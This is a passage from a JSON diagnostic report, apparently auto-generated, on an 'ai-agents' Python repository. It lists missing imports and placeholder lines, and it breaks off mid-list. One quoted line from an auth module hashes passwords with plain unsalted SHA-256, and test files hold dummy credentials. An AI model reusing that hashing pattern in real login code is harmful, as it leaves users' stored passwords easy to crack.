{
  "metadata": {
    "timestamp": "2025-09-05T17:30:48.227513",
    "system": "ai-agents",
    "diagnostic_version": "1.0.0"
  },
  "results": {
    "import_analysis": {
      "missing_modules": [
        "coordination",
        "memory_consolidator",
        "optimization.resource_optimizer",
        "components.performance_monitor",
        "autonomous_service",
        "multi_agent_trainer",
        "async_optimizer",
        "replay_buffer",
        "gymnasium",
        "utils.auth",
        "training",
        "monitoring.alerting_system",
        "vector_memory",
        "azure.cognitiveservices.vision.computervision.models",
        "algorithms",
        "core.coordination.integration_layer",
        "components.real_time_charts",
        "web_interface",
        "azure.cognitiveservices.vision.computervision",
        "examples.demo_agents.document_classifier",
        "monitoring",
        "base_environment",
        "safety",
        "profiling.performance_dashboard",
        "autonomous_security",
        "orchestration",
        "examples.demo_integrations.quickbooks_connector",
        "security",
        "qmix_agent",
        "base_algorithm",
        "optimization.algorithm_optimizer",
        "azure.core.credentials",
        "orchestrator",
        "deployment_service",
        "caching.query_cache",
        "meta_demo.web_interface",
        "torch.optim",
        "performance.optimization.algorithm_optimizer",
        "algorithm_optimizer",
        "autonomous",
        "reasoning_service",
        "faiss",
        "environments.supply_chain_environment",
        "maddpg_agent",
        "dashboard_server",
        "monitoring.metrics_collector",
        "examples.demo_agents.contract_analyzer",
        "trading_environment",
        "evaluation",
        "time_series_processor",
        "resource",
        "torch.utils.data",
        "tree_of_thoughts",
        "core.integration.deployment_manager",
        "rl.training.curriculum",
        "environments.trading_environment",
        "api.database.base",
        "temporal_agent",
        "memory_profiler",
        "rl.algorithms.ppo_agent",
        "rl.environments.resource_allocation_environment",
        "tools.safe_exec_tool",
        "resource_allocation_environment",
        "behavior_validator",
        "security_service",
        "agent_repository",
        "examples.demo_agents.purchase_order_agent",
        "specialized_agents",
        "services.data_service",
        "objgraph",
        "sac_agent",
        "profiling.memory_profiler",
        "agent_protocol",
        "core.integration.master_controller",
        "performance.optimization.async_optimizer",
        "working_memory",
        "autonomous_events",
        "meta_demo.business_impact",
        "predictive_coordinator",
        "algorithms.base_algorithm",
        "performance.caching.redis_cache",
        "rl.environments.base_environment",
        "components.roi_analytics",
        "performance_dashboard",
        "torch.nn.functional",
        "services",
        "strategy_optimizer",
        "environments.resource_allocation_environment",
        "torch.nn",
        "self_modification",
        "events",
        "meta_learning_agent",
        "examples.demo_analytics.roi_calculator",
        "core.security.security_validator",
        "performance.profiling.cpu_profiler",
        "training_callbacks",
        "monitoring.regression_detector",
        "performance.profiling.memory_profiler",
        "meta_demo.demo_engine",
        "cpu_profiler",
        "temporal_reasoning",
        "torch",
        "redis_cache",
        "causal_inference",
        "core.autonomous.orchestrator",
        "utils.formatting",
        "demo_engine",
        "rl.training.training_pipeline",
        "supply_chain_environment",
        "knowledge_transfer",
        "pattern_recognizer",
        "integration",
        "distributed_memory",
        "temporal_engine",
        "behavioral_monitoring",
        "training_pipeline",
        "orchestration_service",
        "performance_benchmarks",
        "profiling.cpu_profiler",
        "core.autonomous.self_modification",
        "ppo_agent",
        "master_controller",
        "business_impact",
        "chromadb",
        "repositories",
        "semantic_search",
        "pattern_extractor",
        "reasoning",
        "caching.memory_cache",
        "rl.environments.supply_chain_environment",
        "interfaces",
        "networks",
        "meta_demo.visualization",
        "algorithms.ppo_agent",
        "rl.environments.trading_environment",
        "aioredis",
        "shared",
        "experiment_manager",
        "environments.base_environment",
        "meta_demo.coordination",
        "optimization.async_optimizer",
        "environments",
        "curriculum",
        "caching.redis_cache",
        "autonomous.safety",
        "components.document_intelligence",
        "reasoning_events",
        "security_events",
        "core.performance.high_performance_optimization",
        "statsmodels.tsa.stattools",
        "meta_orchestrator"
      ],
      "import_issues": [],
      "analyzed_files": 18504
    },
    "placeholder_analysis": {
      "placeholders_found": 234,
      "placeholder_details": [
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 112,
          "content": "def diagnose_placeholders(self) -> Dict[str, Any]:"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 113,
          "content": "\"\"\"Find placeholder functions and incomplete implementations\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 114,
          "content": "logger.info(\"Identifying placeholder implementations...\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 116,
          "content": "placeholders = []"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 130,
          "content": "# Check for common placeholder patterns"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 132,
          "content": "'pass', 'todo', 'fixme', 'not implemented',"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 133,
          "content": "'placeholder', 'mock', 'stub', 'return none',"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 134,
          "content": "'raise notimplementederror', 'coming soon'"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 137,
          "content": "if self._is_problematic_placeholder(line, lines, i-1):"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 139,
          "content": "\"PLACEHOLDER\","
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 141,
          "content": "f\"Line {i}: Placeholder implementation - {line.strip()}\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 143,
          "content": "placeholders.append({"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 150,
          "content": "self.add_warning(\"PLACEHOLDER_ANALYSIS\", str(file_path), f\"Failed to analyze: {e}\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 153,
          "content": "\"placeholders_found\": len(placeholders),"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 154,
          "content": "\"placeholder_details\": placeholders"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 157,
          "content": "def _is_problematic_placeholder(self, line: str, all_lines: List[str], line_index: int) -> bool:"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 158,
          "content": "\"\"\"Check if a placeholder is actually problematic\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 163,
          "content": "'raise notimplementederror',"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 164,
          "content": "'todo',"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 165,
          "content": "'fixme',"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 166,
          "content": "'not implemented',"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 167,
          "content": "'placeholder'"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 373,
          "content": "if 'your_key_here' in content.lower() or 'placeholder' in content.lower():"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 374,
          "content": "self.add_warning(\"CONFIG\", str(env_path), \"Contains placeholder values\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 473,
          "content": "results[\"placeholder_analysis\"] = self.diagnose_placeholders()"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 475,
          "content": "logger.error(f\"Placeholder analysis failed: {e}\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 476,
          "content": "results[\"placeholder_analysis\"] = {\"error\": str(e)}"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 540,
          "content": "# Placeholder issues"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 541,
          "content": "if \"placeholder_analysis\" in results:"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 542,
          "content": "placeholder_count = results[\"placeholder_analysis\"].get(\"placeholders_found\", 0)"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 543,
          "content": "if placeholder_count > 0:"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 547,
          "content": "\"issue\": f\"Found {placeholder_count} placeholder implementations\","
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 548,
          "content": "\"fix\": \"Replace placeholder functions with actual implementations\","
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 549,
          "content": "\"details\": results[\"placeholder_analysis\"].get(\"placeholder_details\", [])"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
          "line": 38,
          "content": "self.passed_count = 0"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
          "line": 61,
          "content": "status_symbol = \"[PASS]\" if status == \"PASS\" else \"[FAIL]\" if status == \"FAIL\" else \"[WARN]\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
          "line": 64,
          "content": "if status == \"PASS\":"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\config.py",
          "line": 322,
          "content": "\"password\": self.redis.redis_password,"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
          "line": 301,
          "content": "- Username/password"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\frameworks\\phase7_experimental_framework.py",
          "line": 188,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\frameworks\\phase7_experimental_framework.py",
          "line": 542,
          "content": "raise NotImplementedError"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\frameworks\\phase7_experimental_framework.py",
          "line": 546,
          "content": "raise NotImplementedError"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\frameworks\\phase7_experimental_framework.py",
          "line": 550,
          "content": "raise NotImplementedError"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
          "line": 869,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
          "line": 911,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
          "line": 141,
          "content": "return {\"passed\": False, \"error\": \"System not set up\"}"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
          "line": 194,
          "content": "return {\"passed\": False, \"error\": \"System not set up\"}"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
          "line": 248,
          "content": "return {\"passed\": False, \"error\": \"System not set up\"}"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
          "line": 301,
          "content": "return {\"passed\": False, \"error\": \"System not set up\"}"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
          "line": 353,
          "content": "return {\"passed\": False, \"error\": \"System not set up\"}"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
          "line": 395,
          "content": "return {\"passed\": False, \"error\": \"System not set up\"}"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
          "line": 509,
          "content": "return {\"passed\": False, \"error\": \"System not set up\"}"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\base_agent.py",
          "line": 352,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\base_agent.py",
          "line": 405,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\base_agent.py",
          "line": 410,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
          "line": 343,
          "content": "summary = {\"passed\": 0, \"failed\": 0, \"skipped\": 0, \"errors\": 0}"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
          "line": 346,
          "content": "if \"passed\" in line and \"failed\" in line:"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
          "line": 371,
          "content": "total_passed = 0"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
          "line": 404,
          "content": "overall_pass = True"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tools\\tool_framework.py",
          "line": 58,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tools\\tool_framework.py",
          "line": 63,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
          "line": 352,
          "content": "# This is a placeholder - replace with actual embedding model"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
          "line": 665,
          "content": "# Placeholder methods for FAISS and ChromaDB operations not implemented yet"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
          "line": 718,
          "content": "# Placeholder methods for ChromaDB recent/frequent queries"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
          "line": 760,
          "content": "'memory_types': [],  # Placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
          "line": 761,
          "content": "'avg_importance': 0.5,  # Placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
          "line": 762,
          "content": "'common_tags': []  # Placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
          "line": 766,
          "content": "\"\"\"Consolidate similar memories (placeholder implementation)\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
          "line": 773,
          "content": "\"\"\"Get memories by tag (placeholder implementation)\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\behavior_validator.py",
          "line": 649,
          "content": "# This is a placeholder - real implementation would need multi-agent test data"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\behavior_validator.py",
          "line": 789,
          "content": "failed_tests = [t for t in test_results if not t.passed]"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
          "line": 154,
          "content": "\"password\": \"testpass\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
          "line": 738,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_component_interactions.py",
          "line": 41,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_component_interactions.py",
          "line": 1468,
          "content": "passed_tests = sum(1 for result in test_results if result.success)"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_component_interactions.py",
          "line": 1469,
          "content": "failed_tests = total_tests - passed_tests"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_integration.py",
          "line": 41,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_integration.py",
          "line": 45,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
          "line": 317,
          "content": "total = passed = failed = skipped = 0"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
          "line": 519,
          "content": "f.write(f\"**Overall Success:** {'✅ PASSED' if report.overall_success else '❌ FAILED'}\\n\\n\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
          "line": 274,
          "content": "memory_usage=0.0,  # TODO: Add memory tracking"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
          "line": 627,
          "content": "coherence_score = 0.8  # Placeholder - would need sophisticated coherence analysis"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
          "line": 715,
          "content": "if perf[\"pass_rate\"] < 0.8:"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
          "line": 41,
          "content": "'passed': self.passed,"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
          "line": 1190,
          "content": "passed_tests = [r for r in self.results if r.passed]"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "line": 217,
          "content": "\"\"\"Test authentication bypass attempts\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "line": 220,
          "content": "# Common authentication bypass attempts"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "line": 221,
          "content": "bypass_attempts = ["
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "line": 263,
          "content": "'admin': 'secure_password_hash_12345',"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "line": 264,
          "content": "'user1': 'user_password_hash_67890',"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "line": 542,
          "content": "async def test_authentication_bypass_attempts(self, security_framework):"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "line": 543,
          "content": "\"\"\"Test authentication bypass protection\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
          "line": 544,
          "content": "bypass_attempts = ["
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\base_algorithm.py",
          "line": 139,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\base_algorithm.py",
          "line": 144,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\base_algorithm.py",
          "line": 149,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\base_algorithm.py",
          "line": 154,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\networks.py",
          "line": 128,
          "content": "\"\"\"Forward pass returning mean and log_std\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\networks.py",
          "line": 417,
          "content": "Forward pass of mixing network"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\networks.py",
          "line": 496,
          "content": "\"\"\"Forward pass with noisy linear transformation\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
          "line": 179,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
          "line": 184,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
          "line": 265,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
          "line": 270,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
          "line": 275,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
          "line": 443,
          "content": "\"\"\"Create RGB array representation (placeholder)\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
          "line": 444,
          "content": "# Return simple placeholder image"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\performance_monitor.py",
          "line": 419,
          "content": "# Create placeholder for real-time updates"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\performance_monitor.py",
          "line": 420,
          "content": "placeholder = st.empty()"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\performance_monitor.py",
          "line": 480,
          "content": "with placeholder.container():"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
          "line": 25,
          "content": "# from .websocket_handler import WebSocketHandler  # Not implemented yet"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
          "line": 26,
          "content": "# from .metrics_collector import MetricsCollector  # Not implemented yet"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
          "line": 27,
          "content": "# from .visualization_engine import VisualizationEngine  # Not implemented yet"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
          "line": 28,
          "content": "# from .interaction_tracker import InteractionTracker  # Not implemented yet"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
          "line": 51,
          "content": "# self.websocket_handler = WebSocketHandler()  # Not implemented yet"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
          "line": 52,
          "content": "# self.metrics_collector = MetricsCollector()  # Not implemented yet"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
          "line": 53,
          "content": "# self.visualization_engine = VisualizationEngine()  # Not implemented yet"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
          "line": 54,
          "content": "# self.interaction_tracker = InteractionTracker()  # Not implemented yet"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
          "line": 69,
          "content": "\"\"\"Hash password using SHA-256\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
          "line": 70,
          "content": "return hashlib.sha256(password.encode()).hexdigest()"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
          "line": 97,
          "content": "\"\"\"Authenticate user with email and password\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
          "line": 101,
          "content": "stored_password = self.users[email]['password']"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
          "line": 188,
          "content": "email = st.text_input(\"📧 Email Address\", placeholder=\"Enter your email\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
          "line": 189,
          "content": "password = st.text_input(\"🔑 Password\", type=\"password\", placeholder=\"Enter your password\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
          "line": 754,
          "content": "# Placeholder for strategy innovation detection"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
          "line": 759,
          "content": "# Placeholder for learning acceleration detection"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
          "line": 826,
          "content": "# Placeholder for specialization detection"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\orchestrator.py",
          "line": 784,
          "content": "# Placeholder implementations for complex analysis methods"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
          "line": 344,
          "content": "# For now, return a placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
          "line": 345,
          "content": "return f\"# Current implementation for {agent_name}.{component}\\n# Placeholder for actual code extraction\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
          "line": 1149,
          "content": "'tests_passed': 0,"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
          "line": 1404,
          "content": "# For now, we'll create placeholder specialists"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
          "line": 983,
          "content": "# Placeholder implementations for complex operations"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
          "line": 1077,
          "content": "# Disaster recovery placeholder implementations"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
          "line": 1079,
          "content": "# Placeholder implementations for complex methods"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
          "line": 1122,
          "content": "return []  # Placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
          "line": 1126,
          "content": "return []  # Placeholder"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
          "line": 1226,
          "content": "# Additional helper methods with placeholder implementations"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\orchestration\\orchestrator.py",
          "line": 290,
          "content": "\"\"\"Execute task with agents in sequence, passing results forward\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
          "line": 122,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
          "line": 180,
          "content": "pass"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
          "line": 249,
          "content": "pass"
        },
        {
